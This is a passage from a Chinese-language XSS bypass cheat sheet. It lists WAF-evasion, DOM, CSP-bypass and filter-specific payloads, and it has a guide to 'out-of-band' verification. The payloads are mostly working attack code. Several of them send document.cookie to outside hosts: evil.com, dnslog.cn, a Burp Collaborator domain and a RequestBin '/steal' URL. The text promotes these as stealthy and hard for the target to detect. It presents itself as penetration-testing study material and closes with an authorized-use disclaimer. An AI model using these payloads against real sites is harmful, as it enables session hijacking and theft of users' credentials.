8. 实战绕过案例
9. 外带服务验证技术（新增）

通过学习这些技术，可以更好地理解 XSS 攻击的原理和绕过方法，从而更好地防范 XSS 漏洞。

**重要提醒**：
- 不要死记 Payload，先理解每关的源码过滤规则
- 遇到卡关时，多尝试"反常识"操作
- 记录靶场中的冷知识，这些在真实场景中可能用到
- 在实际渗透测试中，优先使用外带验证技术（如 DNSLog.cn），而非 alert 弹窗

**外带验证技术要点**：
- 外带验证比 alert 弹窗更隐蔽、更专业
- 可以获取敏感信息（cookie、URL、referrer 等）
- 适合自动化测试和批量验证
- 为漏洞报告提供有力证据
- 常用外带服务：DNSLog.cn、Burp Collaborator、XSS Hunter 等

---

**文档版本**: 1.1
**最后更新**: 2026-02-09

---

## 十五、WAF 绕过技术

### 15.1 随机大小写

```javascript
<ScRiPt>AlErT(1)</ScRiPt>
<ImG SrC=x OnErRoR=AlErT(1)>
```

### 15.2 插入垃圾字符

```javascript
<scri<!--x-->pt>alert(1)</scri<!--x-->pt>
<img sr<!--x-->c=x onerr<!--x-->or=alert(1)>
```

### 15.3 双重编码

```javascript
%253Cscript%253Ealert(1)%253C/script%253E
```

### 15.4 混合编码

```javascript
<scr\u0069pt>alert(1)</scr\u0069pt>
<img src=x onerror=al\u0065rt(1)>
```

---

## 十六、DOM XSS 技术

### 16.1 Location 操作

```javascript
#hash
<script>eval(location.hash.slice(1))</script>
#<script>alert(1)</script>

#search
<script>eval(location.search.slice(1))</script>
?<script>alert(1)</script>
```

### 16.2 Cookie 操作

```javascript
<script>document.write(document.cookie)</script>
<script>fetch('http://evil.com?c='+document.cookie)</script>
```

### 15.3 DOM 操作

```javascript
<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
<script>document.createElement('img').src='x';document.querySelector('img').onerror=alert(1)</script>
```

---

## 十七、CSP 绕过技术

### 17.1 JSONP 绕过

```javascript
<script src="https://vulnerable.com/callback?callback=alert(1)"></script>
```

### 17.2 预加载绕过

```javascript
<link rel="preload" href="data:text/html,<script>alert(1)</script>" as="script">
```

### 17.3 iframe 绕过

```javascript
<iframe srcdoc="<script>alert(1)</script>">
```

---

## 十八、测试 Payload 汇总

### 18.1 基础测试集

```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onmouseover=alert(1) x="
' onmouseover=alert(1) x="
javascript:alert(1)
```

### 18.2 编码测试集

```javascript
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
\u003Cscript\u003Ealert(1)\u003C/script\u003E
\x3Cscript\x3Ealert(1)\x3C/script\x3E
```

### 18.3 绕过测试集

```javascript
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr<script>ipt>
<script>alert`1`</script>
<script/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

---

## 十九、针对特定过滤器的 Payload

### 19.1 过滤 script

```javascript
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
```

### 19.2 过滤 alert

```javascript
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>eval('aler\x74(1)')</script>
<script>setTimeout('alert(1)')</script>
```

### 19.3 过滤 onerror

```javascript
<img src=x onload=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### 19.4 过滤 onload

```javascript
<img src=x onerror=alert(1)>
<svg onerror=alert(1)>
<body onmouseover=alert(1)>
```

### 19.5 过滤圆括号

```javascript
<script>alert`1`</script>
<script>alert.call(null,1)</script>
<script>setTimeout`alert\u00281\u0029`</script>
```

### 19.6 过滤引号

```javascript
<script>alert(1)</script>
<script>alert`1`</script>
<script>alert(/1/.source)</script>
```

### 18.7 过滤空格

```javascript
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<script/onload=alert(1)>
```

---

## 二十、实战测试策略

### 20.1 测试顺序

1. **基础测试**: 尝试最简单的 payload
2. **编码测试**: 尝试各种编码方式
3. **绕过测试**: 尝试各种绕过技术
4. **上下文测试**: 根据注入点上下文调整 payload
5. **组合测试**: 组合多种绕过技术

### 20.2 测试方法

1. **观察过滤**: 分析哪些字符被过滤
2. **测试边界**: 测试过滤器的边界条件
3. **组合技术**: 组合多种绕过技术
4. **持续尝试**: 不要放弃，持续尝试新方法

### 20.3 成功标准

#### Alert 弹窗验证（基础验证）

- 弹出 alert(1)
- 页面标题变为 "警报（1） --- alert(1)"
- 控制台执行 alert(1)

#### 外带回显验证（推荐）

**DNSLog.cn 外带回显**：
1. 访问 `http://www.dnslog.cn/`
2. 查看是否有新的 DNS 查询记录
3. 确认查询记录包含预期的数据（如 cookie、URL 等）
4. 对 Base64 编码的数据进行解码，验证内容正确性

**Burp Collaborator 外带回显**：
1. 打开 Burp Suite 的 Burp Collaborator Client
2. 查看是否有新的交互记录
3. 确认交互类型（DNS、HTTP、SMTP 等）
4. 查看接收到的数据内容

**XSS Hunter 外带回显**：
1. 登录 XSS Hunter 平台
2. 查看是否有新的 XSS 触发记录
3. 确认触发时间、目标 URL、浏览器信息
4. 查看捕获的 cookie 和其他敏感信息

**RequestBin/Webhook.site 外带回显**：
1. 访问 RequestBin 或 Webhook.site 页面
2. 查看是否有新的 HTTP 请求
3. 确认请求方法（GET/POST）
4. 查看请求参数和请求体中的数据

**WebSocket 外带回显**：
1. 检查 WebSocket 服务器日志
2. 确认是否收到新的连接
3. 验证接收到的消息内容
4. 确认数据格式和内容正确性

#### 验证优先级

**推荐验证顺序**：
1. **外带回显验证**（首选）：隐蔽、专业、适合自动化
2. **控制台日志验证**：快速、不影响页面
3. **页面修改验证**：直观、易于确认
4. **Alert 弹窗验证**：最后选择、需要用户交互

#### 外带回显验证的优势

- ✅ **无需用户交互**：自动触发，无需人工确认
- ✅ **隐蔽性强**：不易被目标系统察觉
- ✅ **数据完整**：可以获取完整的敏感信息
- ✅ **可追溯**：记录详细的请求信息
- ✅ **适合自动化**：可以集成到自动化测试流程
- ✅ **证据充分**：为漏洞报告提供有力证据

#### 验证示例

**示例 1：DNSLog.cn 验证**
```javascript
// Payload
<script>
var img = new Image();
img.src = "http://www.dnslog.cn/test-" + btoa(document.cookie);
</script>

// 验证步骤
1. 访问 http://www.dnslog.cn/
2. 查看是否有包含 "test-" 的 DNS 查询记录
3. 复制 Base64 编码的数据
4. 使用 base64 -d 解码
5. 确认解码后的 cookie 内容正确
```

**示例 2：Burp Collaborator 验证**
```javascript
// Payload
<script>
var img = new Image();
img.src = "http://your-collaborator-payload.burpcollaborator.net/" + document.cookie;
</script>

// 验证步骤
1. 打开 Burp Collaborator Client
2. 查看是否有新的 DNS 交互
3. 确认交互包含 cookie 数据
4. 查看详细的交互信息（时间、IP、请求头等）
```

**示例 3：RequestBin 验证**
```javascript
// Payload
<script>
var img = new Image();
img.src = "https://your-requestbin-url.com/steal?data=" + encodeURIComponent(document.cookie);
</script>

// 验证步骤
1. 访问 RequestBin 页面
2. 查看是否有新的 HTTP 请求
3. 确认请求参数 data 包含 cookie
4. 查看请求头中的其他信息（User-Agent、Referer 等）
```

#### 验证失败排查

如果外带回显验证失败，检查以下内容：

1. **网络连接**：
   - 确认目标服务器可以访问外带服务
   - 检查防火墙是否阻止了 DNS/HTTP 请求
   - 确认外带服务是否正常运行

2. **Payload 正确性**：
   - 确认 Payload 语法正确
   - 检查是否被过滤器修改
   - 验证外带 URL 是否正确

3. **数据编码**：
   - 确认特殊字符已正确编码
   - 检查 Base64 编码是否完整
   - 验证 URL 编码是否正确

4. **浏览器兼容性**：
   - 测试不同浏览器的兼容性
   - 检查是否使用了不支持的 API
   - 确认浏览器没有阻止请求

5. **CSP 限制**：
   - 检查内容安全策略是否阻止外带请求
   - 尝试使用允许的域名
   - 考虑使用 CSP 绕过技术

---

## 二十一、常见过滤器绕过表

| 过滤器 | 绕过方法 |
|--------|----------|
| script | img, svg, iframe, body |
| alert | prompt, confirm, eval |
| onerror | onload, onmouseover, onfocus |
| onload | onerror, onmouseover, onfocus |
| () | 反引号, call, apply |
| "" | 反引号, /1/.source |
| 空格 | /, 换行符 |
| 大小写 | 混合大小写, Unicode |
| HTML 实体 | 原始字符, Unicode |
| URL 编码 | 原始字符, 双重编码 |

---

**文档结束**

*本文档仅供授权的安全测试使用。未经授权的渗透测试是非法的。*
